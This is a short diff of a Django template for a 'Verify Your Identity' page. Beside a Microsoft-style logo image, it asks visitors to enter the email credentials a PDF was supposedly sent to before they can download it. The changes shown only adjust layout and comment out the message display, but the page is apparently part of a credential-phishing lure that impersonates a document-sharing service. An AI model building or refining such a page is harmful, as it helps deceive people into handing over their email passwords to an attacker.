@@ -15,7 +15,7 @@
               <img src="{% static 'images/micro.png' %}" alt="" width="150px" height="150px" class="img-fluid">
               </diV>
               
-              <div class="card  mx-auto" style="max-width: 25rem; height: 38rem;">
+              <div class="card  mx-auto" style="max-width: 25rem; height: 35rem;">
                 <h3 class="fw-normal text-center p-3">Verify Your Identity</h3>
             <hr>
               <div class="px-4">
@@ -27,7 +27,7 @@
               <p>To receive and download this PDF file, please enter specific email credentials that this document was sent to.</p>
               <div class="text-center py-3">
               <img src="{% static 'images/blueo.png' %}" alt="" width="150px" height="150px" class="img-fluid mb-3"><br>
-              <div class="container">
+              {% comment %} <div class="container">
                 {% if messages  %}
                 {% for message in messages %}
                 
@@ -38,7 +38,7 @@
                 {% endfor %}
         
                 {% endif %}
-              </div>
+              </div> {% endcomment %}
 
               </div>
               
